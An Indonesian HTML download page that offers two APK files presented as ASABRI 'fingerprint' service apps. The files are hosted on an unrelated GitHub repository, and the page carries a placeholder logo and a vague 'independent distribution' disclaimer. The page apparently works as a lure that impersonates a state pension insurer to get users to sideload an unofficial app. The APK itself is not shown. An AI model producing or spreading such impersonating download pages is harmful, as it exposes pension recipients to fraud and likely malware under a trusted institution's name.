
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Halaman Unduhan Aplikasi</title>

  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      min-height: 100vh;
      font-family: Arial, sans-serif;
      background: #f4f6f9;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 25px;
    }

    .container {
      width: 100%;
      max-width: 420px;
      text-align: center;
      background: white;
      padding: 35px 25px;
      border-radius: 18px;
      box-shadow: 0 5px 25px rgba(0,0,0,0.08);
    }

    .logo {
      width: 150px;
      height: 120px;
      object-fit: contain;
      margin-bottom: 20px;
    }

    h2 {
      color: #183b67;
      font-size: 21px;
      margin-bottom: 25px;
    }

    .download-btn {
      display: block;
      width: 100%;
      padding: 17px 12px;
      margin: 15px 0;
      background: #1769aa;
      color: white;
      text-decoration: none;
      font-weight: bold;
      font-size: 16px;
      border-radius: 9px;
    }

    .download-btn:hover {
      background: #104e82;
    }

    .alternative {
      background: #16834a;
    }

    .alternative:hover {
      background: #106738;
    }

    .notice {
      margin-top: 25px;
      font-size: 12px;
      line-height: 1.6;
      color: #777;
    }
  </style>
</head>

<body>

  <div class="container">

    <!-- LOGO MILIKMU -->
    <img src="images/logo.png" alt="Logo" class="logo">

    <h2>Unduh Aplikasi</h2>

    <a href="https://github.com/indo-01/contoh1/releases/latest/download/ASABRI.sofware.sidik-jari.apk"
       class="download-btn">
       Unduh Layanan ASABRI
    </a>

    <a href="https://github.com/indo-01/contoh1/releases/latest/download/sofware.sidik-jari.apk"
       class="download-btn alternative">
       Unduh Alternatif ASABRI
    </a>

    <p class="notice">
      Halaman distribusi aplikasi independen.
      Periksa identitas pengembang dan keaslian aplikasi
      sebelum memasangnya.
    </p>

  </div>

</body>
</html>
